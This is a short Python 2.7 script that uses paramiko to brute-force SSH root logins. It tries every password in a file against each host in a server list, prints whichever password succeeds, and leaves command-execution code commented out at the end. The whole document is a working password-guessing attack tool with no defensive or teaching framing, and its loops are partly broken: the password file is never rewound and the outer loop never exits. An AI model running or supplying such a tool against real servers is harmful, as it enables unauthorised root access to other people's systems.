#!/usr/bin/python2.7
##
import paramiko
import sys


passwd=file('password_file','r')
hosts=file('servers','r')
port = 22
username='root'

while True:
    z = hosts.readline()
    z = z.rstrip()
    #if not z: break
    print z
    while True:
      x = passwd.readline()
      x = x.rstrip()
      if not x: break
      hostname = z
      password = x
      try:
        client = paramiko.Transport((hostname, port))
        check=client.connect(username=username, password=password)
        client.close
        print ("The server: "+hostname+" has the following Password: "+password)
      except paramiko.ssh_exception.AuthenticationException:
        print ("password is incorrect")
        client.close
#stdout_data = []
#stderr_data = []
#session = client.open_channel(kind='session')
#session.exec_command(command)
#while True:
#    if session.recv_ready():
#        stdout_data.append(session.recv(nbytes))
#    if session.recv_stderr_ready():
#        stderr_data.append(session.recv_stderr(nbytes))
#    if session.exit_status_ready():
#        break

#print 'exit status: ', session.recv_exit_status()
#print ''.join(stdout_data)
#print ''.join(stderr_data)

#session.close()
#client.close()
